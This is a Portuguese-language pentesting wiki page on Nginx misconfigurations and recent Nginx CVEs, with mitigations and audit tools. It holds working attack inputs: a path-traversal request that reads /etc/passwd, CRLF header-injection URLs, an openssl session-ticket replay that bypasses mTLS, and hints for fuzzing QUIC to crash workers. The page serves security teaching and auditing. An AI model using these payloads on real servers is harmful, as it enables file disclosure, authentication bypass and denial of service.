# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Localização root ausente <a href="#missing-root-location" id="missing-root-location"></a>

Ao configurar o servidor Nginx, a **root directive** desempenha um papel crítico ao definir o diretório base a partir do qual os arquivos são servidos. Considere o exemplo abaixo:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Nesta configuração, `/etc/nginx` é designado como diretório root. Essa configuração permite o acesso a arquivos dentro do diretório root especificado, como `/hello.txt`. Contudo, é importante notar que apenas uma location específica (`/hello.txt`) está definida. Não há configuração para a location raiz (`location / {...}`). Essa omissão significa que a diretiva root se aplica globalmente, permitindo que requisições para o caminho raiz `/` acessem arquivos sob `/etc/nginx`.

Surgem considerações críticas de segurança a partir dessa configuração. Uma simples requisição `GET`, como `GET /nginx.conf`, poderia expor informações sensíveis ao servir o arquivo de configuração do Nginx localizado em `/etc/nginx/nginx.conf`. Definir o root para um diretório menos sensível, como `/etc`, poderia mitigar esse risco, porém ainda pode permitir acesso não intencional a outros arquivos críticos, incluindo outros arquivos de configuração, access logs e até credenciais encriptadas usadas para HTTP basic authentication.

## Misconfiguração do Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nos arquivos de configuração do Nginx, é necessário inspecionar atentamente as diretivas "location". Uma vulnerabilidade conhecida como Local File Inclusion (LFI) pode ser inadvertidamente introduzida por meio de uma configuração que se assemelha ao seguinte:
```
location /imgs {
alias /path/images/;
}
```
Esta configuração é suscetível a ataques LFI porque o servidor interpreta requisições como `/imgs../flag.txt` como uma tentativa de acessar arquivos fora do diretório pretendido, efetivamente resolvendo para `/path/images/../flag.txt`. Essa falha permite que atacantes recuperem arquivos do sistema de arquivos do servidor que não deveriam ser acessíveis via web.

Para mitigar essa vulnerabilidade, a configuração deve ser ajustada para:
```
location /imgs/ {
alias /path/images/;
}
```
Mais informações: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Testes Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Restrição de caminho inseguro <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Consulte a página a seguir para aprender como realizar bypass em diretivas como:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Uso inseguro de variáveis / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variáveis vulneráveis `$uri` e `$document_ur`i e isso pode ser corrigido substituindo-as por `$request_uri`.
>
> Uma regex também pode ser vulnerável, por exemplo:
>
> `location ~ /docs/([^/])? { … $1 … }` - Vulnerável
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Não vulnerável (verificando espaços)
>
> `location ~ /docs/(.*)? { … $1 … }` - Não vulnerável

Uma vulnerabilidade na configuração do Nginx é demonstrada pelo exemplo abaixo:
```
location / {
return 302 https://example.com$uri;
}
```
Os caracteres \r (Carriage Return) e \n (Line Feed) significam caracteres de nova linha em requisições HTTP, e suas formas URL-encoded são representadas como `%0d%0a`. Incluir esses caracteres em uma request (por exemplo, `http://localhost/%0d%0aDetectify:%20clrf`) para um servidor mal configurado faz com que o servidor emita um novo header chamado `Detectify`. Isso acontece porque a variável $uri decodifica os caracteres de nova linha URL-encoded, levando a um header inesperado na resposta:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Saiba mais sobre os riscos de CRLF injection e response splitting em [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Além disso, esta técnica é [**explicada nesta palestra**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) com alguns exemplos vulneráveis e mecanismos de detecção. Por exemplo, para detectar essa má configuração a partir de uma perspectiva blackbox, você pode usar estas requisições:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Se vulnerável, a primeira retornará pois "X" é qualquer método HTTP e a segunda retornará um erro pois "H" não é um método válido. Assim, o servidor receberá algo como: `GET / H HTTP/1.1` e isso disparará o erro.

Outros exemplos de detecção seriam:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Algumas configurações vulneráveis encontradas e apresentadas nessa palestra foram:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Observe novamente como **`$uri`** está na URL (desta vez dentro de um parâmetro)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Agora no AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Qualquer variável

Foi descoberto que **dados fornecidos pelo usuário** podem ser tratados como uma **variável do Nginx** em determinadas circunstâncias. A causa desse comportamento permanece algo elusiva, porém não é rara nem simples de verificar. Essa anomalia foi destacada em um relatório de segurança no HackerOne, que pode ser consultado [aqui](https://hackerone.com/reports/370094). Investigações adicionais na mensagem de erro levaram à identificação de sua ocorrência dentro do [módulo de filtro SSI da base de código do Nginx](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), apontando Server Side Includes (SSI) como a causa raiz.

Para **detectar essa configuração incorreta**, o seguinte comando pode ser executado, que envolve definir o cabeçalho Referer para testar a impressão de variáveis:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Scans por essa misconfiguração através dos sistemas revelaram múltiplas instâncias onde variáveis do Nginx poderiam ser exibidas por um usuário. No entanto, a diminuição do número de instâncias vulneráveis sugere que esforços para corrigir essa questão foram, em certa medida, bem-sucedidos.

### Usando try_files com variáveis $URI$ARGS

A seguinte misconfiguração do Nginx pode levar a uma vulnerabilidade LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Na nossa configuração temos a diretiva `try_files`, que é usada para verificar a existência de arquivos em uma ordem especificada. O Nginx vai servir o primeiro que encontrar. A sintaxe básica da diretiva `try_files` é a seguinte:
```
try_files file1 file2 ... fileN fallback;
```
Nginx verificará a existência de cada arquivo na ordem especificada. Se um arquivo existir, ele será servido imediatamente. Se nenhum dos arquivos especificados existir, a requisição será passada para a opção de fallback, que pode ser outro URI ou uma página de erro específica.

No entanto, ao usar as variáveis `$uri$args` nesta diretiva, o Nginx tentará procurar um arquivo que corresponda ao URI da requisição combinado com quaisquer argumentos da query string. Portanto, podemos explorar esta configuração:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Com o seguinte payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Usando nosso payload vamos escapar do diretório root (definido na configuração do Nginx) e carregar o arquivo `/etc/passwd`. Nos logs de debug podemos observar como o Nginx tenta os arquivos:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC contra o Nginx usando a configuração mencionada acima:
![Example burp request](../../images/nginx_try_files.png)

## Leitura da resposta bruta do backend

Nginx oferece um recurso através de `proxy_pass` que permite a interceptação de erros e headers HTTP produzidos pelo backend, com o objetivo de ocultar mensagens de erro internas e headers. Isso é realizado pelo Nginx servindo páginas de erro personalizadas em resposta a erros do backend. No entanto, surgem problemas quando o Nginx encontra uma requisição HTTP inválida. Essa requisição é encaminhada ao backend tal como foi recebida, e a resposta bruta do backend é então enviada diretamente ao cliente sem a intervenção do Nginx.

Considere um cenário de exemplo envolvendo uma aplicação uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Para gerenciar isso, diretivas específicas na configuração do Nginx são usadas:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Esta diretiva permite que o Nginx sirva uma resposta personalizada para respostas do backend com um código de status maior que 300. Isso garante que, para nossa aplicação uWSGI de exemplo, uma resposta `500 Error` seja interceptada e tratada pelo Nginx.  
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Como o nome indica, esta diretiva oculta cabeçalhos HTTP especificados do cliente, aumentando a privacidade e segurança.

Quando uma requisição `GET` válida é feita, o Nginx a processa normalmente, retornando uma resposta de erro padrão sem revelar quaisquer cabeçalhos secretos. No entanto, uma requisição HTTP inválida contorna esse mecanismo, resultando na exposição de respostas brutas do backend, incluindo cabeçalhos secretos e mensagens de erro.

## merge_slashes definido como off

Por padrão, a **diretiva `merge_slashes`** do Nginx está definida como **`on`**, o que comprime múltiplas barras em uma URL para uma única barra. Esse recurso, embora simplifique o processamento de URLs, pode inadvertidamente ocultar vulnerabilidades em aplicações atrás do Nginx, particularmente aquelas suscetíveis a local file inclusion (LFI). Os especialistas em segurança **Danny Robinson e Rotem Bar** destacaram os riscos potenciais associados a esse comportamento padrão, especialmente quando o Nginx atua como reverse-proxy.

Para mitigar esses riscos, recomenda-se **desativar a diretiva `merge_slashes`** para aplicações suscetíveis a essas vulnerabilidades. Isso garante que o Nginx encaminhe requisições para a aplicação sem alterar a estrutura da URL, não mascarando eventuais problemas de segurança subjacentes.

Para mais informações, veja [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Cabeçalhos de Resposta Maclicious**

Como mostrado em [**este writeup**](https://mizu.re/post/cors-playground), existem certos cabeçalhos que, se presentes na resposta do servidor web, alterarão o comportamento do proxy Nginx. Você pode consultá-los [**na documentação**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indica ao Nginx para redirecionar internamente uma requisição para um local especificado.
- `X-Accel-Buffering`: Controla se o Nginx deve ou não bufferizar a resposta.
- `X-Accel-Charset`: Define o conjunto de caracteres para a resposta ao usar X-Accel-Redirect.
- `X-Accel-Expires`: Define o tempo de expiração para a resposta ao usar X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limita a taxa de transferência para respostas ao usar X-Accel-Redirect.

Por exemplo, o cabeçalho **`X-Accel-Redirect`** causará um **redirecionamento** interno no nginx. Assim, ter uma configuração do nginx com algo como **`root /`** e uma resposta do servidor web com **`X-Accel-Redirect: .env`** fará com que o nginx envie o conteúdo de **`/.env`** (Path Traversal).

### **Valor padrão na diretiva map**

Na **configuração do Nginx**, a diretiva `map` frequentemente desempenha um papel no **controle de autorização**. Um erro comum é não especificar um valor **default**, o que poderia levar a acesso não autorizado. Por exemplo:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sem um `default`, um **usuário mal-intencionado** pode contornar a segurança acessando um **URI indefinido** dentro de `/map-poc`. [O manual do Nginx](https://nginx.org/en/docs/http/ngx_http_map_module.html) recomenda definir um **valor padrão** para evitar tais problemas.

### **Vulnerabilidade de DNS Spoofing**

DNS spoofing contra o Nginx é viável sob certas condições. Se um atacante conhece o **servidor DNS** usado pelo Nginx e pode interceptar suas consultas DNS, ele pode falsificar registros DNS. Esse método, no entanto, é ineficaz se o Nginx estiver configurado para usar **localhost (127.0.0.1)** para resolução DNS. O Nginx permite especificar um servidor DNS da seguinte forma:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` e `internal` Diretivas**

A diretiva **`proxy_pass`** é utilizada para redirecionar requisições para outros servidores, seja internamente ou externamente. A diretiva **`internal`** garante que certos blocos `location` sejam acessíveis apenas dentro do Nginx. Embora essas diretivas não sejam vulnerabilidades por si só, sua configuração exige exame cuidadoso para prevenir falhas de segurança.

## proxy_set_header Upgrade & Connection

Se o servidor nginx estiver configurado para repassar os headers Upgrade e Connection, um [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) poderia ser realizado para acessar endpoints protegidos/internos.

> [!CAUTION]
> Esta vulnerabilidade permitiria a um atacante **estabelecer uma conexão direta com o endpoint `proxy_pass`** (`http://backend:9999` neste caso) cujo conteúdo não será verificado pelo nginx.

Example of vulnerable configuration to steal `/flag` from [aqui](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Observe que mesmo se o `proxy_pass` estivesse apontando para um **path** específico como `http://backend:9999/socket.io`, a conexão será estabelecida com `http://backend:9999`, então você pode **contatar qualquer outro path dentro desse internal endpoint. Portanto, não importa se um path está especificado na URL do proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Durante 2024, o Nginx divulgou CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 e CVE-2024-35200, mostrando que uma **single hostile QUIC session** pode crash worker processes ou leak memory sempre que o experimental `ngx_http_v3_module` estiver compilado e um socket `listen ... quic` estiver exposto. Builds impactadas são 1.25.0–1.25.5 e 1.26.0, enquanto 1.27.0/1.26.1 trazem as correções; a divulgação de memória (CVE-2024-34161) adicionalmente requer MTUs maiores que 4096 bytes para expor dados sensíveis (detalhes no advisory do nginx 2024 referenciado abaixo).

**Recon & exploitation hints**

- HTTP/3 é opt-in, então escaneie por respostas `Alt-Svc: h3=":443"` ou brute-force UDP/443 QUIC handshakes; uma vez confirmado, fuzz o handshake e os STREAM frames com payloads customizados do `quiche-client`/`nghttp3` para causar worker crashes e forçar log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

Um aviso de fevereiro de 2025 divulgou que o nginx 1.11.4–1.27.3 compilado com OpenSSL permite **reusar uma sessão TLS 1.3** de um virtual host baseado em nome dentro de outro, então um cliente que negociou com um host sem certificado pode reproduzir o ticket/PSK para entrar em um vhost protegido com `ssl_verify_client on;` e pular totalmente o mTLS. O bug é acionado sempre que múltiplos virtual hosts compartilham o mesmo cache de sessão TLS 1.3 e tickets (veja o advisory do nginx de 2025 referenciado abaixo).

**Playbook do atacante**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Se o alvo for vulnerável, o segundo handshake é concluído sem apresentar um certificado de cliente, revelando locais protegidos.

**O que auditar**

- Blocos `server_name` mistos que compartilham `ssl_session_cache shared:SSL` mais `ssl_session_tickets on;`.
- Blocos Admin/API que esperam mTLS mas herdam configurações compartilhadas de cache de sessão/ticket de hosts públicos.
- Automação que habilita TLS 1.3 session resumption globalmente (e.g., Ansible roles) sem considerar o isolamento de vhost.

## Resiliência ao HTTP/2 Rapid Reset (comportamento CVE-2023-44487)

O ataque HTTP/2 Rapid Reset (CVE-2023-44487) ainda afeta nginx quando operadores aumentam `keepalive_requests` ou `http2_max_concurrent_streams` além dos padrões: um atacante abre uma conexão HTTP/2, a inunda com milhares de streams, e então envia imediatamente frames `RST_STREAM` de modo que o teto de concorrência nunca é atingido enquanto a CPU continua ocupada na lógica de encerramento. Os padrões do nginx (128 concurrent streams, 1000 keepalive requests) mantêm o raio de impacto pequeno; elevar esses limites "substancialmente" torna trivial esgotar workers mesmo a partir de um único cliente (veja o write-up da F5 referenciado abaixo).

**Dicas de detecção**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts que revelam valores incomumente altos para essas diretivas são alvos preferenciais: um cliente HTTP/2 pode iterar pela criação de streams e enviar instantaneamente frames `RST_STREAM` para manter a CPU no máximo sem disparar o limite de concorrência.

## Experimente você mesmo

Detectify criou um repositório no GitHub onde você pode usar Docker para configurar seu próprio servidor de teste Nginx vulnerável com algumas das misconfigurações discutidas neste artigo e tentar encontrá-las por conta própria!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Ferramentas de análise estática

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (um fork atualizado do GIXY) é uma ferramenta para analisar configurações do Nginx, com o objetivo de encontrar vulnerabilidades, diretivas inseguras e misconfigurações arriscadas. Também encontra misconfigurações que afetam o desempenho e detecta oportunidades perdidas de hardening, permitindo a detecção automatizada de falhas.
- [gixy-ng](https://github.com/dvershinin/gixy) (o fork ativamente mantido do GIXY) é uma ferramenta para analisar configurações do Nginx, com o objetivo de encontrar vulnerabilidades, diretivas inseguras e misconfigurações arriscadas. Também encontra misconfigurações que afetam o desempenho e detecta oportunidades perdidas de hardening, permitindo a detecção automatizada de falhas.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner é uma ferramenta simples para procurar misconfigurações comuns do Nginx e vulnerabilidades.

## Referências

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
